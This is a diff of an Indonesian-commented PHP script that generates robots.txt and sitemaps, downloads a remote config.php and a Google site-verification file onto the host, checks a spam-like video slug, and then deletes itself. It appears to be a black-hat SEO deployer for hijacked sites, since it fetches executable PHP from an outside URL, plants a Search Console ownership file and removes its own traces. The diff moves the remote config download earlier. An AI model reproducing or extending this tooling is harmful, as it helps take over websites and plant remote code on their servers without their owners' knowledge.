@@ -96,11 +96,12 @@ function buat_robots_txt($domain) {
 // --- [FUNGSI UTAMA (DIBAGI 2 BAGIAN)] ---
 
 /**
- * BAGIAN 1: Menjalankan Tugas 1, 2, 3 (JSON, Robots, Sitemap)
+ * BAGIAN 1: Menjalankan Tugas 1, 2, 3, 4 (JSON, Robots, Sitemap, Config)
  */
 function jalankan_proses_seo_part1() {
     global $clean_host, $cache_dir, $local_json_path, $server_path, 
-           $base_json_url_path, $local_sitemap_path, $self_script_name;
+           $base_json_url_path, $local_sitemap_path, $self_script_name,
+           $config_url, $local_config_path; // [DITAMBAH]
 
     if (!isset($_GET['json_file']) || empty(trim($_GET['json_file']))) {
         header('Location: ' . $self_script_name);
@@ -181,24 +182,7 @@ function jalankan_proses_seo_part1() {
     @file_put_contents($local_sitemap_path, $xml_index);
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index dan $num_maps sub-sitemap dibuat."];
 
-    // Panggil terminal untuk Jeda Pengecekan Slug
-    tampilkan_log_terminal($logs, 'step2_check_slug', $json_filename, $clean_host);
-}
-
-/**
- * BAGIAN 2: Menjalankan Tugas 4 & 5 (Config, Google)
- */
-function jalankan_proses_seo_part2() {
-    global $clean_host, $config_url, $google_url, $local_config_path, $local_google_path, $self_script_name;
-
-    // Ambil json_filename dari URL
-    $json_filename = $_GET['json_file'] ?? '';
-
-    $logs = [
-        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses...']
-    ];
-
-    // --- TUGAS 4: UNDUH CONFIG.PHP ---
+    // --- TUGAS 4: UNDUH CONFIG.PHP [DIPINDAH KE SINI] ---
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php...'];
     $config_content = fetchRawUrl($config_url);
     if ($config_content !== false && !empty($config_content)) {
@@ -207,8 +191,25 @@ function jalankan_proses_seo_part2() {
     } else {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh config.php.'];
     }
-    
-    // --- TUGAS 5: UNDUH GOOGLE HTML ---
+
+    // Panggil terminal untuk Jeda Pengecekan Slug
+    tampilkan_log_terminal($logs, 'step2_check_slug', $json_filename, $clean_host);
+}
+
+/**
+ * BAGIAN 2: Menjalankan Tugas 5 (Google)
+ */
+function jalankan_proses_seo_part2() {
+    global $clean_host, $google_url, $local_google_path, $self_script_name; // [DIHAPUS] config
+
+    // Ambil json_filename dari URL
+    $json_filename = $_GET['json_file'] ?? '';
+
+    $logs = [
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses...']
+    ];
+
+    // --- TUGAS 5: UNDUH GOOGLE HTML [HANYA INI YANG TERSISA] ---
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh google8f39414e57a5615a.html...'];
     $google_content = fetchRawUrl($google_url);
     if ($google_content !== false && !empty($google_content)) {
@@ -226,13 +227,12 @@ function jalankan_proses_seo_part2() {
 
 
 /**
- * Fungsi untuk menampilkan UI Terminal dengan log (DIMODIFIKASI)
+ * Fungsi untuk menampilkan UI Terminal dengan log
  * $next_action: 'step2_check_slug', 'status', 'final_error'
  */
 function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename = '', $clean_host = '') {
     global $self_script_name;
     
-    // Siapkan URL untuk JavaScript
     $step2_url = $self_script_name . '?action=generate_step2&json_file=' . urlencode($json_filename);
     $status_url = $self_script_name . '?status=completed&json_file=' . urlencode($json_filename);
     $check_slug_url = 'https://' . $clean_host . '/wanz-895-eng-sub';
@@ -271,7 +271,6 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
         const container = document.getElementById("logsContainer");
         let currentLog = 0; let currentChar = 0; let currentLine = null;
         
-        // Ambil variabel PHP
         const next_action = "' . $next_action . '";
         const step2_url = "' . $step2_url . '";
         const status_url = "' . $status_url . '";
@@ -279,31 +278,22 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
 
         function typeNextChar() {
             if (currentLog >= logs.length) {
-                // Semua log selesai diketik, tentukan aksi selanjutnya
                 
                 if (next_action === "step2_check_slug") {
-                    // --- LOGIKA BARU UNTUK CEK SLUG ---
                     let promptLine = document.createElement("div");
                     promptLine.className = "log-entry";
                     promptLine.innerHTML = \'<span class="timestamp">' . date('H:i:s') . '</span><span class="log-warning typing">Tekan ENTER untuk Cek Slug (' . htmlspecialchars($check_slug_url) . ')...</span>\';
                     container.appendChild(promptLine);
 
-                    // Tambahkan listener keyboard
                     document.addEventListener("keydown", function(e) {
                         if (e.key === "Enter") {
-                            // Hentikan listener agar tidak ter-trigger dua kali
                             e.preventDefault(); 
-                            
-                            // Buka tab baru
                             window.open(check_slug_url, \'_blank\');
-                            
-                            // Lanjutkan ke step 2
                             window.location.href = step2_url;
                         }
-                    });
+                    }, { once: true }); // [PENTING] { once: true } mencegah listener ter-trigger berkali-kali
 
                 } else if (next_action === "status") {
-                    // --- LOGIKA LAMA (Ke Halaman Status) ---
                     setTimeout(() => {
                         container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                         setTimeout(() => {
@@ -312,14 +302,12 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
                     }, 500);
 
                 } else if (next_action === "final_error") {
-                    // Berhenti jika ada error fatal (misal: gagal buat folder)
                     container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                 }
                 
-                return; // Hentikan fungsi typeNextChar
+                return;
             }
             
-            // Logika mengetik log
             const log = logs[currentLog];
             if (currentChar === 0) {
                 currentLine = document.createElement("div");
@@ -347,7 +335,7 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
 
 
 /**
- * Fungsi hapus_skrip_sendiri (Dengan Peringatan Verifikasi Google)
+ * Fungsi hapus_skrip_sendiri
  */
 function hapus_skrip_sendiri() {
     global $self_script_name, $full_domain_url;
@@ -408,7 +396,7 @@ function hapus_skrip_sendiri() {
                             window.location.href = \'' . $self_script_name . '?action=delete&confirm=yes\';
                         });
                     }
-                });
+                }, { once: true });
                 return;
             }
             const log = logs[currentLog];
@@ -524,7 +512,7 @@ function tampilkan_status_selesai() {
                     if ((e.key === "r" || e.key === "R") && action_type === "refresh") {
                         window.location.reload();
                     }
-                });
+                }, { once: true });
                 return;
             }
             const log = logs[currentLog];
